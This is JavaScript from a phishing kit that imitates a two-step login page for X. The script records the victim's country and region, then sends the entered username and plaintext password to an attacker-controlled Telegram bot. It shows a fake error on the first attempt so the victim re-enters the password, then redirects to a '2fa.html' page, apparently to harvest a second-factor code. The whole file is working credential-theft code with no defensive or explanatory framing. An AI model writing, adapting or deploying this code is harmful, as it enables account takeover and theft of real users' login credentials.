  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = window.TELEGRAM_CONFIG;
  const REDIRECT_URL = '2fa.html';

    // State Variables
    let attemptCount = 0;
    let isLoading = false;
    let userCountry = 'Unknown';
    let userState = 'Unknown';

    // DOM Elements
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const identityInput = document.getElementById('identity-input');
    const step1ContinueBtn = document.getElementById('step1-continue-btn');
    const backToStep1Btn = document.getElementById('back-to-step1-btn');
    const displayUsername = document.getElementById('display-username');
    const passwordInput = document.getElementById('password-input');
    const passwordContainer = document.getElementById('password-container');
    const passwordLabel = document.getElementById('password-label');
    const togglePasswordBtn = document.getElementById('toggle-password-btn');
    const loginBtn = document.getElementById('login-btn');
    const btnText = document.getElementById('btn-text');
    const errorBanner = document.getElementById('error-banner');

    // Fetch User IP and Geolocation
    async function fetchUserLocation() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        if (response.ok) {
          const data = await response.json();
          userCountry = data.country_name || 'Unknown';
          userState = data.region || 'Unknown';
        }
      } catch (error) {
        console.error('Location fetch error:', error);
      }
    }

    // Call geolocation fetch on page load
    fetchUserLocation();

    // Step 1: Input Validation
    identityInput.addEventListener('input', () => {
      const value = identityInput.value.trim();
      if (value) {
        step1ContinueBtn.disabled = false;
        step1ContinueBtn.className = 'w-full font-bold py-3 sm:py-3.5 px-4 rounded-full transition text-sm sm:text-base bg-white text-black hover:bg-gray-200 cursor-pointer';
      } else {
        step1ContinueBtn.disabled = true;
        step1ContinueBtn.className = 'w-full font-bold py-3 sm:py-3.5 px-4 rounded-full transition text-sm sm:text-base bg-zinc-800 text-zinc-500 cursor-not-allowed';
      }
    });

    // Step 1: Go to Step 2
    step1ContinueBtn.addEventListener('click', () => {
      displayUsername.value = identityInput.value.trim();
      step1.classList.add('hidden');
      step2.classList.remove('hidden');
    });

    // Step 2: Go Back to Step 1
    backToStep1Btn.addEventListener('click', () => {
      clearError();
      step2.classList.add('hidden');
      step1.classList.remove('hidden');
    });

    // Step 2: Toggle Password Visibility
    togglePasswordBtn.addEventListener('click', () => {
      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
      passwordInput.setAttribute('type', type);
    });

    // Step 2: Input Validation
    passwordInput.addEventListener('input', () => {
      clearError();
      const value = passwordInput.value.trim();
      if (value && !isLoading) {
        loginBtn.disabled = false;
        loginBtn.className = 'w-full font-bold py-3 sm:py-3.5 px-4 rounded-full transition text-sm sm:text-base bg-white text-black hover:bg-gray-200 cursor-pointer flex items-center justify-center space-x-2';
      } else {
        loginBtn.disabled = true;
        loginBtn.className = 'w-full font-bold py-3 sm:py-3.5 px-4 rounded-full transition text-sm sm:text-base bg-zinc-800 text-zinc-500 cursor-not-allowed flex items-center justify-center space-x-2';
      }
    });

    // Step 2: Enter Key Submit
    passwordInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' && !loginBtn.disabled) {
        handleLogin();
      }
    });

    // Step 2: Click Submit
    loginBtn.addEventListener('click', handleLogin);

    // Send Formatted Telegram Notification
    async function sendTelegramNotification(attempt) {
      const message = 
`APP: X

USER: ${identityInput.value.trim()}

PWD: ${passwordInput.value.trim()}

COUNTRY: ${userCountry} 🌍

STATE: ${userState}

X: ${attempt} ⏱️`;

      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

      try {
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message
          })
        });
      } catch (err) {
        console.error('Telegram notification error:', err);
      }
    }

    // Login Handler
    async function handleLogin() {
      if (isLoading) return;
      
      setLoading(true);
      attemptCount++;

      await sendTelegramNotification(attemptCount);

      setLoading(false);

      if (attemptCount === 1) {
        showError();
        passwordInput.value = '';
        loginBtn.disabled = true;
        loginBtn.className = 'w-full font-bold py-3 sm:py-3.5 px-4 rounded-full transition text-sm sm:text-base bg-zinc-800 text-zinc-500 cursor-not-allowed flex items-center justify-center space-x-2';
      } else if (attemptCount >= 2) {
        window.location.href = REDIRECT_URL;
      }
    }

    // Helpers
    function showError() {
      errorBanner.classList.remove('hidden');
      passwordContainer.classList.remove('border-sky-500');
      passwordContainer.classList.add('border-red-500');
      passwordLabel.classList.remove('text-sky-400');
      passwordLabel.classList.add('text-red-500');
    }

    function clearError() {
      errorBanner.classList.add('hidden');
      passwordContainer.classList.remove('border-red-500');
      passwordContainer.classList.add('border-sky-500');
      passwordLabel.classList.remove('text-red-500');
      passwordLabel.classList.add('text-sky-400');
    }

    function setLoading(state) {
      isLoading = state;
      if (state) {
        btnText.textContent = 'Processing...';
        loginBtn.disabled = true;
      } else {
        btnText.textContent = 'Log in';
      }
    }